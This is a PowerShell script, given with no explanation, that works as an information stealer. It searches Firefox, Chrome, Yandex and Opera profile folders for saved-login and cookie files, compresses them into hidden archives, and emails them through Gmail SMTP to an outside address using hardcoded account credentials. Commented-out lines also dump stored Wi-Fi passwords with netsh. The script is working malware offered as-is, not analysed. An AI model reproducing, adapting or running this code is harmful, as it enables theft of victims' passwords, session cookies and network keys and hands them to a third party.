# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
# echo "qwe"
# $e=""
#######
# $l=($env:TEMP+"\proc_$env:computername.log")
# function WL{
#   Param ([string]$LS)
#   $St = (Get-Date)#.toString("yyyy/MM/dd HH:mm:ss")
#   ac $l -value "$St $LS"
# }
# function WL{
#   Param ([string]$LS)
#   $LOG = ($LOG + $LS)
# }
$LOG=""
$LOG = ("$LOG Start ")
#######
if(Test-Path "C:\Program Files\7-Zip\3123127z.exe"){
  cd "C:\Program Files\7-Zip\"
  $arh="7"
}
elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
  cd "C:\Program Files\WinRAR\"
  $arh="W"
}
else{WL "asd"}
$LOG = ($LOG + $arh)
echo $arh
###########
$A=$env:APPDATA
$L=$env:LOCALAPPDATA
$lst = @{0=(("$A\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
        1=(("$L\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
        2=(("$L\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
        3=(("$A\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies", "Local State");
        4=(("$A\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
###########
for ($i=0; $i -lt 5; $i++){
  $SMTPServer="smtp.gmail.com"
  $SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587)
  $SMTPInfo.EnableSsl=$true
  $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1")
  $ReportEmail=New-Object System.Net.Mail.MailMessage
  $ReportEmail.From="f7swwq@gmail.com"
  $ReportEmail.To.Add("keklol2045@gmail.com")
  if(Test-Path $lst[$i][0]){
    echo '+++++++++', $arh, '+++++++++'
    echo ($lst[$i][0])
    $p=("$env:TEMP\"+$lst[$i][1])
    #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
    if($arh-eq "7"){
      $p=($p+".zip")
     .\7z.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
     }
    elseif($arh-eq "W"){
      $p=($p+".rar")
      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 #-hput -inul
    }
    else{
      try{$p=($p+".zip")
        gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
      }
      catch{
        $LOG = ("$LOG nothing!!! ")
#         $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
 #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)

        #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
#         $file="C:\Users\qwe\Desktop\sdsdas.png"
#         [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
#         [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
#         $ZipFile.Dispose()
      }
    }
    $LOG = ("$LOG $p")
    attrib +H $p
    echo ("____ "+$p)
    $ReportEmail.Subject=$lst[$i][1]
    $ReportEmail.Body=$LOG
    # arh
    $s=New-Object Net.Mail.Attachment($p)
    $ReportEmail.Attachments.Add($s)
    # log
#     $s=New-Object Net.Mail.Attachment($l)
#     $ReportEmail.Attachments.Add($s)

    $SMTPInfo.Send($ReportEmail)
#     rm $p
#     $s.Dispose()
  echo '----------', $arh, '----------'
  }
  else{
#     WL ($lst[$i][1])
    $LOG = ($LOG+" "+($lst[$i][1]))
    echo ($lst[$i][1]) #$e=$e+' '+$lst[$i][1]#     
  }
}
# WL "END"
# echo "56565656565656565656565656"
#WL (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize
# > $env:TEMP\w.txt
# $w=$env:TEMP+'\w.txt'
# if("7"-in $arh)
#   {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
# else
#   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
# echo "dadasdasdasdasasd"
#######################
# exit

